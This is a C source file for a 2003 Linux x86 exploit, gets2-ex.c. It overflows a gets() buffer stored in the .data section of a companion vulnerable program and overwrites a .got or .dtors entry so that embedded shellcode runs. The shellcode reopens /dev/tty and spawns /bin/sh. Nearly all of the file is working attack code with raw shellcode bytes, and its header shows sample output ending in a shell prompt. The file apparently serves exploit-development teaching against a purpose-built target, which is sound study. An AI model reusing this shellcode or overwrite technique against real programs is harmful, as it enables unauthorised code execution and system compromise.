/*
 * $Id: gets2-ex.c,v 1.1.1.1 2004/05/29 14:15:04 raptor Exp $
 *
 * gets2-ex.c - gets2.c exploit (vuln buf in .data section)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Another exploit for gets() vulnerability: this time the vuln buffer is
 * stored into .data section. We can overwrite __deregister_frame_info in
 * .got, first .dtors pointer or (in case we have an explicit exit() in
 * the vuln program) exit() entry in .got. Get the parameters you need with
 * gdb (b main, p &buf, main i s, etc.).
 *
 * $ ./gets2-ex | LD_BIND_NOW=1 ./gets2
 * Using offset: 500
 * Using ret: 0x80494e0
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF	501		// 500 + 1 (offset to __deregister_frame_info)
//#define BUF	477		// 476 + 1 (offset to .dtors)
#define NOP	0x90		// nop padding
#define	RET	0x080494e0	// buf address in .data section

char sc[] = /* linux/x86 shellcode (8 + 23 + 24  = 55 bytes) */
/* close(0) */
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
/* open("/dev/tty", O_RDWR | ...) */
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
/* execve("/bin/sh", ["/bin/sh"], NULL) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char *argv[])
{
	char buf[BUF];
	int i;

	int *p = (int *)(buf);
	int ret = RET;

	fprintf(stderr, "Using offset: %d\n", BUF - 1);
	fprintf(stderr, "Using ret: %p\n", ret);

	/* place our ret into the whole buffer */
	for (i = 0; i < BUF - 1; i += 4)
		*p++ = ret;
	*p = 0x0;

	/* place the shellcode at the beginning of the buffer */
	for (i = 0; i < strlen(sc); i++)
		buf[i] = sc[i];

	/* output the evil string */
	fprintf(stdout, "%s", buf);
}
